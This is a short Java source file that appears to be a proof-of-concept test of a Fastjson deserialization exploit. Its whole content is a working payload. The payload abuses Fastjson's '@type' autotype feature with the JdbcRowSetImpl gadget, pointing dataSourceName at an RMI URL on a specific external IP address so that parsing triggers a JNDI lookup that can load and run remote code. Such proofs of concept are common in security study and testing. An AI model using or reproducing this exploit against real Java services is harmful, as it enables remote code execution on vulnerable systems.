package serialize;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.sun.rowset.JdbcRowSetImpl;

import java.sql.SQLException;

public class Test {
    public static void main(String[] args) throws SQLException {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://43.142.11.126:1099/yg39ph\",\"autoCommit\":true}";
        JSON.parseObject(payload);


    }
}
